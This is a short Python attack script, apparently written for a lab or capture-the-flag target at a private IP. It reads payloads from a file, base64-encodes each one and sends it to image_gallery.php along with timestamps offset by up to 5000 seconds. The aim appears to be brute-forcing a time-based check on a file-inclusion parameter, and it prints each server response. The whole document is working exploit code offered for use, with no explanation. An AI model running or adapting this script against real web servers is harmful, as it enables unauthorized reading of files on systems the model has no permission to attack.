#!/usr/bin/env python3
import requests
import base64
import os

ip = "192.168.218.22"
url = f"http://{ip}/image_gallery.php"

with open('payload2.txt') as file:
    for payload in file:
        # Find difference of timestamp
        for i in range(1, 5000):
            s = os.popen("date +%s")
            t = int(s.read())-i
            print(f"The offset being tried is {i}")
        # Base64 encoding for payload
            word = payload.strip('\r').strip('\n')
            encode_payload_bytes = base64.b64encode(word.encode('utf-8'))
            encode_payload = encode_payload_bytes.decode('utf-8')
            print(f"Payload: {word}\nEncoded Payload: {encode_payload}\nt: {str(t)}")

            try:
                params = {'t':str(t),'f':encode_payload}
                r = requests.get(url,params=params)
                print("-----------Response Begin-----------")
                response = r.text
                if not response:
                    print("No Response")
                else:
                    print(response)
                print("-----------Response End-----------")
            except Exception as e:
                print(e)
